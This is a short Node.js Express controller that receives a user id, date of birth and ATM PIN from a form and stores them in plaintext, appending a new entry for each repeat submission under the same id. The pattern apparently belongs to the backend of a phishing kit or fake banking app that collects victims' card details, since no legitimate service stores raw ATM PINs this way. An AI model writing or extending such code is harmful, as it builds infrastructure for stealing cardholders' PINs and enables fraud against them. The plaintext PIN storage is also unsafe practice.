// controllers/additionalDataController.js
const AdditionalData = require('../models/AdditionalData');

exports.saveAdditionalData = async (req, res) => {
  try {
    const { uniqueid, dob, atmPin } = req.body;
    let record = await AdditionalData.findOne({ uniqueid });

    if (record) {
      record.entries.push({ dob, atmPin });
    } else {
      record = new AdditionalData({
        uniqueid,
        entries: [{ dob, atmPin }]
      });
    }

    await record.save();

    return res.status(200).json({
      success: true,
      message: "Additional data submitted successfully!"
    });
  } catch (error) {
    console.error("Error saving additional data:", error);
    return res.status(500).json({
      success: false,
      message: "Error occurred while submitting additional data"
    });
  }
};
